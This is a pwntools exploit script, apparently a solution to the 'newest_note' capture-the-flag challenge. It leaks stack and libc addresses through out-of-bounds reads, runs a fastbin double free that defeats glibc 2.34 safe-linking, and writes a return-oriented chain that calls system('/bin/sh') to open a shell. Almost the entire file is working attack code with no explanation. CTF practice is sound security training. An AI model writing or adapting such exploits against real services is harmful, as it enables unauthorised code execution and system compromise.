# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './newest_note'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(idx , text = 'a'):
    cmd(1)
    sla('Index:' , idx)
    sa('Content:' , text)

def show(idx ):
    cmd(3)
    sla('Index:' , idx)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)
# libc 2.34


def attack():
    
    sla('be? :' , 0x20100000)
    # sla('be? :' , 0x100)

    add(0)
    
    # _environ
    # show(0x13c7cf)
    show(0x1437f5)
    stack_addr = l64() - 0x130
    # dbg()
    
    # dbg()
    # _IO_stdfile_0_lock
    show(0x14399a)
    libc.address = l64() - 0x218cc0
    
    # dbg()
    
    lg('libc.address' , libc.address)
    lg('stack_addr' , stack_addr)
    
    dbg()
    for i in range(10):
        add(i+1)
    
    delete(0)
    show(0)
    ru('Content: ')
    key = uu64(5)
    
    for i in range(6):
        delete(i+1)
    
    delete(7)
    delete(8)
    delete(7)
    
    for i in range(7):
        add(i)
    
    system_addr = libc.sym['system']
    pop_rdi_ret = libc.search(asm('pop rdi;ret')).next()
    binsh = libc.search('/bin/sh\x00').next()
    ret = pop_rdi_ret +1
    
    add(9 , p64((stack_addr-8)^key))
    add(10)
    add(11)
    
    payload = flat(ret , ret ,pop_rdi_ret , binsh , system_addr)
    
    # dbg()
    
    add(12 , payload)
    # dbg()
    cmd(4)
    # dbg()
    
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   newest_note.py
@Time    :   2022/05/29 14:13:25
@Author  :   Niyah 
'''